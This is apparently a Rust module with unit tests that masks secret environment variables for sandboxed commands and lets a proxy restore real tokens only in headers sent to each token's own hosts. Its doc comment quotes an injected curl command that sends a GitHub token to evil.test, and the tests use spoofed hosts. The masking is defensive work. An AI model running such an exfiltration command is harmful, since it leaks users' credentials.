//! Credential masking for sandboxed commands (Linux and macOS).
//!
//! A token in the app's environment (`GH_TOKEN`, `NPM_TOKEN`, `XAI_API_KEY`
//! and anything else named like a secret) reaches a sandboxed command only as
//! a placeholder: the same prefix and length, random after that, fixed for
//! the session. The egress proxy puts the real value back only in request
//! headers, only on HTTPS it terminates itself ([`super::mitm`]), and only
//! for the hosts that token is for. So an injected
//! `curl https://evil.test -H "Authorization: $GH_TOKEN"` sends a string that
//! opens nothing, while `gh` and `git` against GitHub keep working.
//!
//! A secret with no known host is masked and never put back.

use std::sync::OnceLock;

use base64::Engine as _;
use zeroize::Zeroizing;

const GITHUB: &[&str] = &["github.com", "githubusercontent.com"];
const HUGGING_FACE: &[&str] = &["huggingface.co", "hf.co"];
const NPM: &[&str] = &["registry.npmjs.org"];

/// Where each known token may go. Each host covers its subdomains.
const INJECT: &[(&str, &[&str])] = &[
    ("GH_TOKEN", GITHUB),
    ("GITHUB_TOKEN", GITHUB),
    ("GITLAB_TOKEN", &["gitlab.com"]),
    ("NPM_TOKEN", NPM),
    ("NODE_AUTH_TOKEN", NPM),
    ("CARGO_REGISTRY_TOKEN", &["crates.io"]),
    ("HF_TOKEN", HUGGING_FACE),
    ("HUGGING_FACE_HUB_TOKEN", HUGGING_FACE),
    ("XAI_API_KEY", &["api.x.ai"]),
];

/// Names that read as a secret.
const SECRET_SUFFIXES: &[&str] = &[
    "_TOKEN",
    "_API_KEY",
    "_APIKEY",
    "_SECRET",
    "_SECRET_KEY",
    "_ACCESS_KEY",
    "_PASSWORD",
    "_PASSWD",
    "_PAT",
];

/// Shorter values are flags or ids, not credentials.
const MIN_LEN: usize = 8;

pub struct Mask {
    pub var: String,
    real: Zeroizing<String>,
    pub placeholder: String,
    pub inject: &'static [&'static str],
}

impl std::fmt::Debug for Mask {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("Mask")
            .field("var", &self.var)
            .field("inject", &self.inject)
            .finish_non_exhaustive()
    }
}

#[derive(Debug, Default)]
pub struct Masks {
    list: Vec<Mask>,
}

/// This session's masks, from the app's own environment at first use.
pub fn session() -> &'static Masks {
    static MASKS: OnceLock<Masks> = OnceLock::new();
    MASKS.get_or_init(|| Masks::from_vars(std::env::vars()))
}

fn is_secret_name(name: &str) -> bool {
    INJECT.iter().any(|(n, _)| *n == name) || SECRET_SUFFIXES.iter().any(|s| name.ends_with(s))
}

/// A stand-in with the token's own prefix (`ghp_`, `sk-`, `hf_`) and length,
/// so a client that checks the shape still accepts it.
fn placeholder(real: &str) -> String {
    let keep = real
        .char_indices()
        .take(8)
        .find(|(_, c)| matches!(c, '_' | '-'))
        .map(|(i, _)| i + 1)
        .filter(|_| real.is_ascii())
        .unwrap_or(0);
    let want = real.chars().count().saturating_sub(keep).max(MIN_LEN);
    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let mut bytes = vec![0u8; want];
    let rng = ring::rand::SystemRandom::new();
    if ring::rand::SecureRandom::fill(&rng, &mut bytes).is_err() {
        // No randomness: a fixed stand-in still hides the token.
        bytes.iter_mut().enumerate().for_each(|(i, b)| *b = i as u8);
    }
    let tail: String = bytes
        .iter()
        .map(|b| ALPHABET[*b as usize % ALPHABET.len()] as char)
        .collect();
    format!("{}{tail}", &real[..keep])
}

/// A short random tag for this session's private folders.
pub fn session_tag() -> String {
    static TAG: OnceLock<String> = OnceLock::new();
    TAG.get_or_init(|| placeholder("xxxxxxxxxxxxxxxx").to_ascii_lowercase())
        .clone()
}

pub fn covers(domain: &str, host: &str) -> bool {
    host == domain
        || host
            .strip_suffix(domain)
            .is_some_and(|rest| rest.ends_with('.'))
}

impl Masks {
    pub fn from_vars(vars: impl IntoIterator<Item = (String, String)>) -> Self {
        let mut list: Vec<Mask> = vars
            .into_iter()
            .filter(|(name, value)| {
                is_secret_name(name)
                    && value.len() >= MIN_LEN
                    && !value.contains(char::is_whitespace)
            })
            .map(|(var, real)| {
                let inject = INJECT
                    .iter()
                    .find(|(n, _)| *n == var)
                    .map(|(_, hosts)| *hosts)
                    .unwrap_or(&[]);
                let placeholder = placeholder(&real);
                Mask {
                    var,
                    real: Zeroizing::new(real),
                    placeholder,
                    inject,
                }
            })
            .collect();
        list.sort_by(|a, b| a.var.cmp(&b.var));
        Self { list }
    }

    #[cfg(test)]
    pub fn for_test(var: &str, real: &str, inject: &'static [&'static str]) -> Self {
        Self {
            list: vec![Mask {
                var: var.to_string(),
                real: Zeroizing::new(real.to_string()),
                placeholder: placeholder(real),
                inject,
            }],
        }
    }

    pub fn is_empty(&self) -> bool {
        self.list.is_empty()
    }

    /// The variables a sandboxed command gets in place of the real ones.
    pub fn command_env(&self) -> Vec<(String, String)> {
        self.list
            .iter()
            .map(|m| (m.var.clone(), m.placeholder.clone()))
            .collect()
    }

    /// Every host some token may go to: the proxy ends TLS only for these.
    pub fn inject_hosts(&self) -> Vec<&'static str> {
        let mut out: Vec<&'static str> = self.list.iter().flat_map(|m| m.inject).copied().collect();
        out.sort_unstable();
        out.dedup();
        out
    }

    /// Whether a token may be put back on a request to `host`.
    pub fn intercepts(&self, host: &str) -> bool {
        self.list
            .iter()
            .any(|m| m.inject.iter().any(|d| covers(d, host)))
    }

    /// One header line with every placeholder for `host` put back, including
    /// inside `Authorization: Basic` (git sends `user:token` encoded).
    pub fn header_line(&self, host: &str, line: &str) -> String {
        let usable: Vec<&Mask> = self
            .list
            .iter()
            .filter(|m| m.inject.iter().any(|d| covers(d, host)))
            .collect();
        if usable.is_empty() {
            return line.to_string();
        }
        let put_back = |text: &str| {
            usable
                .iter()
                .fold(text.to_string(), |t, m| t.replace(&m.placeholder, &m.real))
        };
        let Some((name, value)) = line.split_once(':') else {
            return line.to_string();
        };
        let value = value.trim_start();
        if name.trim().eq_ignore_ascii_case("authorization") {
            if let Some(encoded) = value
                .strip_prefix("Basic ")
                .or_else(|| value.strip_prefix("basic "))
            {
                let engine = base64::engine::general_purpose::STANDARD;
                if let Some(decoded) = engine
                    .decode(encoded.trim())
                    .ok()
                    .and_then(|b| String::from_utf8(b).ok())
                {
                    let fixed = put_back(&decoded);
                    if fixed != decoded {
                        return format!("{name}: Basic {}", engine.encode(fixed));
                    }
                }
            }
        }
        format!("{name}: {}", put_back(value))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn masks() -> Masks {
        Masks::from_vars([
            (
                "GH_TOKEN".into(),
                "ghp_abcdefghijklmnopqrstuvwxyz0123456789".into(),
            ),
            (
                "MY_SERVICE_API_KEY".into(),
                "sk-live-1234567890abcdef".into(),
            ),
            ("SHORT_TOKEN".into(), "abc".into()),
            ("HOME".into(), "/home/user".into()),
            ("PATH".into(), "/usr/bin".into()),
        ])
    }

    #[test]
    fn secrets_get_a_stand_in_with_their_prefix_and_length() {
        let m = masks();
        let env = m.command_env();
        let names: Vec<&str> = env.iter().map(|(k, _)| k.as_str()).collect();
        assert_eq!(names, ["GH_TOKEN", "MY_SERVICE_API_KEY"]);
        let gh = &env[0].1;
        assert!(gh.starts_with("ghp_"), "{gh}");
        assert_eq!(gh.len(), "ghp_abcdefghijklmnopqrstuvwxyz0123456789".len());
        assert!(!gh.contains("abcdefghij"));
        assert!(env[1].1.starts_with("sk-"), "{}", env[1].1);
        assert!(
            !format!("{m:?}").contains("ghp_abc"),
            "Debug shows no token"
        );
    }

    #[test]
    fn tokens_go_back_only_for_their_own_hosts_and_only_in_headers() {
        let m = masks();
        let gh = m.command_env()[0].1.clone();
        let line = format!("Authorization: token {gh}");
        let real = "ghp_abcdefghijklmnopqrstuvwxyz0123456789";
        assert_eq!(
            m.header_line("api.github.com", &line),
            format!("Authorization: token {real}")
        );
        assert_eq!(m.header_line("evil.test", &line), line);
        assert_eq!(m.header_line("github.com.evil.test", &line), line);
        assert!(m.intercepts("github.com") && m.intercepts("objects.githubusercontent.com"));
        assert!(!m.intercepts("evil.test"));
        assert_eq!(m.inject_hosts(), ["github.com", "githubusercontent.com"]);

        // git's Basic auth.
        let engine = base64::engine::general_purpose::STANDARD;
        let basic = format!(
            "Authorization: Basic {}",
            engine.encode(format!("x-access-token:{gh}"))
        );
        let out = m.header_line("github.com", &basic);
        let decoded = engine
            .decode(out.strip_prefix("Authorization: Basic ").unwrap())
            .unwrap();
        assert_eq!(decoded, format!("x-access-token:{real}").into_bytes());

        // A secret with no known host never goes back.
        let other = m.command_env()[1].1.clone();
        let line = format!("X-Api-Key: {other}");
        assert_eq!(m.header_line("github.com", &line), line);
    }
}
